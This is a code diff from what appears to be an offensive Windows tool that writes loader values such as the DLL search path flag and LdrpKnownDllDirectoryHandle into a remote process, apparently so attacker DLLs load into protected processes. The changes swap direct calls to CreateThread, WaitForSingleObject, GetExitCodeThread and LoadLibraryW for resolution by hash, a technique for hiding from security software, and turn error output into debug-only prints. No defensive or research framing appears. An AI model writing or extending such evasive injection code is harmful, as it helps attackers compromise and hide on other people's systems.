@@ -124,10 +124,13 @@ BOOL write_remote_dll_search_path_flag(
     HANDLE                                  hThread                   = NULL;
     HRESULT                                 ComResult                 = 0;
 
-    // TODO: dinvoke, syscalls
+    // TODO: syscalls
 
-    SysAllocString_t SysAllocString = NULL;
-    CoCancelCall_t   CoCancelCall = NULL;
+    SysAllocString_t      SysAllocString      = NULL;
+    CoCancelCall_t        CoCancelCall        = NULL;
+    CreateThread_t        CreateThread        = NULL;
+    WaitForSingleObject_t WaitForSingleObject = NULL;
+    GetExitCodeThread_t   GetExitCodeThread   = NULL;
 
     SysAllocString = (SysAllocString_t)(ULONG_PTR)get_function_address(
         get_library_address(OLEAUT32_DLL, TRUE),
@@ -146,6 +149,36 @@ BOOL write_remote_dll_search_path_flag(
     if (!CoCancelCall)
     {
         api_not_found("CoCancelCall");
+        goto cleanup;
+    }
+
+    CreateThread = (CreateThread_t)(ULONG_PTR)get_function_address(
+        get_library_address(KERNEL32_DLL, TRUE),
+        CreateThread_SW2_HASH,
+        0);
+    if (!CreateThread)
+    {
+        api_not_found("CreateThread");
+        goto cleanup;
+    }
+
+    WaitForSingleObject = (WaitForSingleObject_t)(ULONG_PTR)get_function_address(
+        get_library_address(KERNEL32_DLL, TRUE),
+        WaitForSingleObject_SW2_HASH,
+        0);
+    if (!WaitForSingleObject)
+    {
+        api_not_found("WaitForSingleObject");
+        goto cleanup;
+    }
+
+    GetExitCodeThread = (GetExitCodeThread_t)(ULONG_PTR)get_function_address(
+        get_library_address(KERNEL32_DLL, TRUE),
+        GetExitCodeThread_SW2_HASH,
+        0);
+    if (!GetExitCodeThread)
+    {
+        api_not_found("GetExitCodeThread");
         goto cleanup;
     }
 
@@ -193,7 +226,7 @@ cleanup:
 
     if (!ret_val)
     {
-        PRINT_ERR("Failed to write DLL search path flag in remote process (thread exit code: 0x%08lx).", dwThreadExitCode);
+        DPRINT_ERR("Failed to write DLL search path flag in remote process (thread exit code: 0x%08lx).", dwThreadExitCode);
     }
 
     return ret_val;
@@ -376,8 +409,19 @@ BOOL find_combase_dll_search_flag_address(
     ULONG_PTR pCandidateAddressForward    = 0;
     ULONG_PTR pCandidateAddressBackward   = 0;
 
-    // TODO: dinvoke
+    LoadLibraryW_t LoadLibraryW = NULL;
+
     *Address = 0;
+
+    LoadLibraryW = (LoadLibraryW_t)(ULONG_PTR)get_function_address(
+        get_library_address(KERNEL32_DLL, TRUE),
+        LoadLibraryW_SW2_HASH,
+        0);
+    if (!LoadLibraryW)
+    {
+        api_not_found("LoadLibraryW");
+        goto cleanup;
+    }
 
     hCombaseModule = LoadLibraryW(STR_MOD_COMBASE);
     if (!hCombaseModule)
@@ -518,8 +562,11 @@ BOOL write_remote_known_dll_handle(
     DWORD                               dwThreadExitCode = ERROR_SUCCESS;
     HANDLE                              hThread          = NULL;
 
-    CoCancelCall_t   CoCancelCall   = NULL;
-    SysAllocString_t SysAllocString = NULL;
+    CoCancelCall_t        CoCancelCall        = NULL;
+    SysAllocString_t      SysAllocString      = NULL;
+    CreateThread_t        CreateThread        = NULL;
+    GetExitCodeThread_t   GetExitCodeThread   = NULL;
+    WaitForSingleObject_t WaitForSingleObject = NULL;
 
     SysAllocString = (SysAllocString_t)(ULONG_PTR)get_function_address(
         get_library_address(OLEAUT32_DLL, TRUE),
@@ -538,6 +585,36 @@ BOOL write_remote_known_dll_handle(
     if (!CoCancelCall)
     {
         api_not_found("CoCancelCall");
+        goto cleanup;
+    }
+
+    CreateThread = (CreateThread_t)(ULONG_PTR)get_function_address(
+        get_library_address(KERNEL32_DLL, TRUE),
+        CreateThread_SW2_HASH,
+        0);
+    if (!CreateThread)
+    {
+        api_not_found("CreateThread");
+        goto cleanup;
+    }
+
+    GetExitCodeThread = (GetExitCodeThread_t)(ULONG_PTR)get_function_address(
+        get_library_address(KERNEL32_DLL, TRUE),
+        GetExitCodeThread_SW2_HASH,
+        0);
+    if (!GetExitCodeThread)
+    {
+        api_not_found("GetExitCodeThread");
+        goto cleanup;
+    }
+
+    WaitForSingleObject = (WaitForSingleObject_t)(ULONG_PTR)get_function_address(
+        get_library_address(KERNEL32_DLL, TRUE),
+        WaitForSingleObject_SW2_HASH,
+        0);
+    if (!WaitForSingleObject)
+    {
+        api_not_found("WaitForSingleObject");
         goto cleanup;
     }
 
@@ -595,7 +672,7 @@ cleanup:
 
     if (!ret_val)
     {
-        PRINT_ERR("Failed to write LdrpKnownDllDirectoryHandle value (thread exit code: 0x%08lx).", dwThreadExitCode);
+        DPRINT_ERR("Failed to write LdrpKnownDllDirectoryHandle value (thread exit code: 0x%08lx).", dwThreadExitCode);
     }
 
     return ret_val;
@@ -642,7 +719,9 @@ BOOL create_task_handler_instance()
     HANDLE  hThread    = NULL;
     DWORD   dwThreadId = 0;
 
-    CoCancelCall_t CoCancelCall = NULL;
+    CoCancelCall_t        CoCancelCall         = NULL;
+    CreateThread_t        CreateThread         = NULL;
+    WaitForSingleObject_t WaitForSingleObject  = NULL;
 
     CoCancelCall = (CoCancelCall_t)(ULONG_PTR)get_function_address(
         get_library_address(OLE32_DLL, TRUE),
@@ -651,6 +730,26 @@ BOOL create_task_handler_instance()
     if (!CoCancelCall)
     {
         api_not_found("CoCancelCall");
+        goto cleanup;
+    }
+
+    CreateThread = (CreateThread_t)(ULONG_PTR)get_function_address(
+        get_library_address(KERNEL32_DLL, TRUE),
+        CreateThread_SW2_HASH,
+        0);
+    if (!CreateThread)
+    {
+        api_not_found("CreateThread");
+        goto cleanup;
+    }
+
+    WaitForSingleObject = (WaitForSingleObject_t)(ULONG_PTR)get_function_address(
+        get_library_address(KERNEL32_DLL, TRUE),
+        WaitForSingleObject_SW2_HASH,
+        0);
+    if (!WaitForSingleObject)
+    {
+        api_not_found("WaitForSingleObject");
         goto cleanup;
     }
 
